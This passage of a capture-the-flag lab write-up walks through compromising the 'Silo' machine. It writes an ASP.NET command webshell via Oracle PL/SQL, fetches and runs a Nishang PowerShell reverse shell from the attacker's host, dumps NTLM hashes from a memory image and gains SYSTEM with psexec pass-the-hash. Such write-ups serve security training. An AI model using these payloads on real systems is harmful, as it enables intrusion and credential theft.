+                &nbsp;&nbsp;&nbsp;&nbsp;s&nbsp;varchar2(1030)&nbsp;:=&nbsp;'&lt;%@&nbsp;Page&nbsp;Language="C#"&nbsp;Debug="true"&nbsp;Trace="false"&nbsp;%&gt;&lt;%@&nbsp;Import&nbsp;Namespace="System.Diagnostics"&nbsp;%&gt;&lt;%@&nbsp;Import&nbsp;Namespace="System.IO"&nbsp;%&gt;&lt;script&nbsp;Language="c#"&nbsp;runat="server"&gt;void&nbsp;Page_Load(object&nbsp;sender,&nbsp;EventArgs&nbsp;e){}string&nbsp;ExcuteCmd(string&nbsp;arg){ProcessStartInfo&nbsp;psi&nbsp;=&nbsp;new&nbsp;ProcessStartInfo();psi.FileName&nbsp;=&nbsp;"cmd.exe";psi.Arguments&nbsp;=&nbsp;"/c&nbsp;"+arg;psi.RedirectStandardOutput&nbsp;=&nbsp;true;psi.UseShellExecute&nbsp;=&nbsp;false;Process&nbsp;p&nbsp;=&nbsp;Process.Start(psi);StreamReader&nbsp;stmrdr&nbsp;=&nbsp;p.StandardOutput;string&nbsp;s&nbsp;=&nbsp;stmrdr.ReadToEnd();stmrdr.Close();return&nbsp;s;}void&nbsp;cmdExe_Click(object&nbsp;sender,&nbsp;System.EventArgs&nbsp;e){Response.Write("&lt;pre&gt;");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("&lt;/pre&gt;");}&lt;/script&gt;&lt;HTML&gt;&lt;body&nbsp;&gt;&lt;form&nbsp;id="cmd"&nbsp;method="post"&nbsp;runat="server"&gt;&lt;asp:TextBox&nbsp;id="txtArg"&nbsp;runat="server"&nbsp;Width="250px"&gt;&lt;/asp:TextBox&gt;&lt;asp:Button&nbsp;id="testing"&nbsp;runat="server"&nbsp;Text="excute"&nbsp;OnClick="cmdExe_Click"&gt;&lt;/asp:Button&gt;&lt;asp:Label&nbsp;id="lblText"&nbsp;runat="server"&gt;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/body&gt;&lt;/HTML&gt;';<br>
+                begin<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;f&nbsp;:=&nbsp;utl_file.fopen('/inetpub/wwwroot',&nbsp;'webshell.aspx',&nbsp;'W');<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;utl_file.put_line(f,s);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;utl_file.fclose(f);<br>
+                end;&nbsp;&nbsp;2&nbsp;&nbsp;&nbsp;&nbsp;3&nbsp;&nbsp;&nbsp;&nbsp;4&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;&nbsp;&nbsp;&nbsp;6&nbsp;&nbsp;&nbsp;&nbsp;7&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;9&nbsp;&nbsp;/<br>
+                <br>
+                PL/SQL&nbsp;procedure&nbsp;successfully&nbsp;completed.
+            </div>
+        </div><br>
+        <br>
+        We'red told that the procedure successfully completed.<br>
+        If you visit <code>http://10.10.10.82/webshell.aspx</code>, you should see your webshell.<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) Get reverse shell</strong></h2><br>
+        The web shell is nice, but an interactive shell is nicer.<br>
+        <br>
+        Nishang is a collection of powershell scripts for red-teaming.<br>
+        Grab Nishang's TCP powershell reverse shell with <code>wget</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/silo#&nbsp;wget&nbsp;https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        Edit the end of the script so that it calls the <code>Invoke-PowerShellTcp</code> function and connects back to your attacking machine.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/silo#&nbsp;nano&nbsp;Invoke-PowerShellTcp.ps1<br>
+                ...<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Write-Error&nbsp;$_<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                }<br>
+                <br>
+                Invoke-PowerShellTcp&nbsp;-Reverse&nbsp;-IPAddress&nbsp;10.10.14.5&nbsp;-Port&nbsp;9001
+            </div>
+        </div><br>
+        <br>
+        Serve the script to the target<br>
+            <div class="codebox">
+                root@gotham:~/ctf/silo#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Start a listener on your attacking machine<br>
+            <div class="codebox">
+                root@gotham:~/ctf/silo#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And run<br>
+        <code>powershell IEX(New-Object Net.WebClient).downloadString('</code><a href="http://10.10.14.5:8000/Invoke-PowerShellTcp.ps1')">http://10.10.14.5:8000/Invoke-PowerShellTcp.ps1')</a> on the webshell to download the reverse shell and run it.<br>
+        <br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        You should see a hit on your server<br>
+            <div class="codebox">
+                ...<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...<br>
+                10.10.10.82&nbsp;-&nbsp;-&nbsp;[04/Sep/2019&nbsp;17:57:56]&nbsp;"GET&nbsp;/Invoke-PowerShellTcp.ps1&nbsp;HTTP/1.1"&nbsp;200&nbsp;-
+            </div>
+        </div><br>
+        <br>
+        And a shell on your listener!<br>
+            <div class="codebox">
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.5]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.82]&nbsp;49164<br>
+                Windows&nbsp;PowerShell&nbsp;running&nbsp;as&nbsp;user&nbsp;SILO$&nbsp;on&nbsp;SILO<br>
+                Copyright&nbsp;(C)&nbsp;2015&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                PS&nbsp;C:\windows\system32\inetsrv&gt;
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) user.txt &amp; Oracle issue.txt</strong></h2><br>
+        With a shell, go grab <code>user.txt</code> from Phineas' desktop.<br>
+            <div class="codebox">
+                PS&nbsp;C:\windows\system32\inetsrv&gt;cd&nbsp;C:\Users\Phineas\Desktop<br>
+                PS&nbsp;C:\Users\Phineas\Desktop&gt;&nbsp;dir<br>
+                <br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Directory:&nbsp;C:\Users\Phineas\Desktop<br>
+                <br>
+                <br>
+                Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LastWriteTime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Length&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;------&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                -a---&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1/5/2018&nbsp;&nbsp;10:56&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;300&nbsp;Oracle&nbsp;issue.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                -a---&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1/4/2018&nbsp;&nbsp;&nbsp;9:41&nbsp;PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;32&nbsp;user.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                <br>
+                <br>
+                PS&nbsp;C:\Users\Phineas\Desktop&gt;&nbsp;cat&nbsp;user.txt<br>
+                92ede778a1cc8d27cb6623055c331617
+            </div>
+        </div><br>
+        <br>
+        You'll also see an <code>Oracle issue.txt</code> note<br>
+            <div class="codebox">
+                PS&nbsp;C:\Users\Phineas\Desktop&gt;&nbsp;cat&nbsp;"Oracle&nbsp;issue.txt"<br>
+                Support&nbsp;vendor&nbsp;engaged&nbsp;to&nbsp;troubleshoot&nbsp;Windows&nbsp;/&nbsp;Oracle&nbsp;performance&nbsp;issue&nbsp;(full&nbsp;memory&nbsp;dump&nbsp;requested):<br>
+                <br>
+                Dropbox&nbsp;link&nbsp;provided&nbsp;to&nbsp;vendor&nbsp;(and&nbsp;password&nbsp;under&nbsp;separate&nbsp;cover).<br>
+                <br>
+                Dropbox&nbsp;link&nbsp;<br>
+                https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0<br>
+                <br>
+                link&nbsp;password:<br>
+                ?%Hm8646uC$
+            </div>
+        </div><br>
+        <br>
+        That password fails at Dropbox.<br>
+        <br>
+        If you read the note the via the webshell instead - <code>type "C:\Users\Phineas\Desktop\Oracle issue.txt"</code>, you'll see that the <code>?</code> is actually a <code>£</code>, which means that there's some weird unicode/ascii encoding bug going on.<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        Access dropbox and download the memory dump.<br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>7) volatility</strong></h2><br>
+        We can use <code>volatility</code> to examine the memory dump - <a href="https://github.com/volatilityfoundation/volatility">https://github.com/volatilityfoundation/volatility</a><br>
+        <br>
+        Volatility requires a profile so that it knows what type of system the memory dump came from.<br>
+        Run <code>systeminfo</code> on the target to find the OS and architecture.<br>
+            <div class="codebox">
+                PS&nbsp;C:\Users\Phineas\Desktop&gt;&nbsp;systeminfo<br>
+                <br>
+                Host&nbsp;Name:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SILO<br>
+                OS&nbsp;Name:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;Server&nbsp;2012&nbsp;R2&nbsp;Standard<br>
+                OS&nbsp;Version:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6.3.9600&nbsp;N/A&nbsp;Build&nbsp;9600<br>
+                ...<br>
+                System&nbsp;Type:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x64-based&nbsp;PC
+            </div>
+        </div><br>
+        <br>
+        The target is Windows Server 2012 R2 x64<br>
+        <br>
+        <code>volatility --info</code> will list available profiles (as well as a bunch more info, long list warning)<br>
+            <div class="codebox">
+                root@gotham:~/ctf/silo#&nbsp;volatility&nbsp;--info<br>
+                Volatility&nbsp;Foundation&nbsp;Volatility&nbsp;Framework&nbsp;2.6<br>
+                <br>
+                ...<br>
+                <br>
+                Profiles<br>
+                --------<br>
+                ...<br>
+                Win2012R2x64&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;A&nbsp;Profile&nbsp;for&nbsp;Windows&nbsp;Server&nbsp;2012&nbsp;R2&nbsp;x64<br>
+                Win2012R2x64_18340&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;A&nbsp;Profile&nbsp;for&nbsp;Windows&nbsp;Server&nbsp;2012&nbsp;R2&nbsp;x64&nbsp;(6.3.9600.18340&nbsp;/&nbsp;2016-05-13)<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        The <code>Win2012R2x64</code> profile looks like what we want.<br>
+        <br>
+        Unzip the download <code>MEMORY DUMP.zip</code> and the extracted <code>SILO-20180105-221806.zip</code> file.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/silo#&nbsp;unzip&nbsp;MEMORY\&nbsp;DUMP.zip&nbsp;<br>
+                Archive:&nbsp;&nbsp;MEMORY&nbsp;DUMP.zip<br>
+                &nbsp;extracting:&nbsp;SILO-20180105-221806.zip&nbsp;&nbsp;<br>
+                root@gotham:~/ctf/silo#&nbsp;unzip&nbsp;SILO-20180105-221806.zip&nbsp;<br>
+                Archive:&nbsp;&nbsp;SILO-20180105-221806.zip<br>
+                &nbsp;&nbsp;inflating:&nbsp;SILO-20180105-221806.dmp&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Run volatility against the memory dump and use the <code>hashdump</code> plugin to dump the NTLM hashes stored in memory at the time of the crash.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/silo#&nbsp;volatility&nbsp;-f&nbsp;SILO-20180105-221806.dmp&nbsp;--profile&nbsp;Win2012R2x64&nbsp;hashdump<br>
+                Volatility&nbsp;Foundation&nbsp;Volatility&nbsp;Framework&nbsp;2.6<br>
+                Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::<br>
+                Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>
+                Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>8) psexec.py</strong></h2><br>
+        With an Administrator hash, you can remotely log in as SYSTEM using Impacket's psexec.py (because samba is available).<br>
+        <code>psexec.py Administrator@10.10.10.82 --hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7</code><br>
+        <br>
+            <div class="codebox">
+                root@gotham:~/ctf/silo#&nbsp;locate&nbsp;psexec.py<br>
+                /usr/share/doc/python-impacket/examples/psexec.py<br>
+                /usr/share/keimpx/lib/psexec.py<br>
+                /usr/share/set/src/fasttrack/psexec.py<br>
+                root@gotham:~/ctf/silo#&nbsp;cp&nbsp;/usr/share/doc/python-impacket/examples/psexec.py&nbsp;.<br>
+                root@gotham:~/ctf/silo#&nbsp;./psexec.py&nbsp;Administrator@10.10.10.82&nbsp;-hashes&nbsp;aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7<br>
+                Impacket&nbsp;v0.9.19&nbsp;-&nbsp;Copyright&nbsp;2019&nbsp;SecureAuth&nbsp;Corporation<br>
+                <br>
+                [*]&nbsp;Requesting&nbsp;shares&nbsp;on&nbsp;10.10.10.82.....<br>
+                [*]&nbsp;Found&nbsp;writable&nbsp;share&nbsp;ADMIN$<br>
+                [*]&nbsp;Uploading&nbsp;file&nbsp;DvDorNFd.exe<br>
+                [*]&nbsp;Opening&nbsp;SVCManager&nbsp;on&nbsp;10.10.10.82.....<br>
+                [*]&nbsp;Creating&nbsp;service&nbsp;YTCD&nbsp;on&nbsp;10.10.10.82.....<br>
+                [*]&nbsp;Starting&nbsp;service&nbsp;YTCD.....<br>
+                [!]&nbsp;Press&nbsp;help&nbsp;for&nbsp;extra&nbsp;shell&nbsp;commands<br>
+                Microsoft&nbsp;Windows&nbsp;[Version&nbsp;6.3.9600]<br>
+                (c)&nbsp;2013&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                C:\Windows\system32&gt;whoami<br>
+                nt&nbsp;authority\system
+            </div>
+        </div><br>
+        <br>
+        A SYTSEM shell!<br>
+        Go grab root.txt :)<br>
+            <div class="codebox">
+                C:\Windows\system32&gt;cd&nbsp;C:\Users\Administrator\Desktop&nbsp;&nbsp;<br>
+                <br>
+                C:\Users\Administrator\Desktop&gt;type&nbsp;root.txt<br>
+                cd39ea0af657a495e33bc59c7836faf6
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
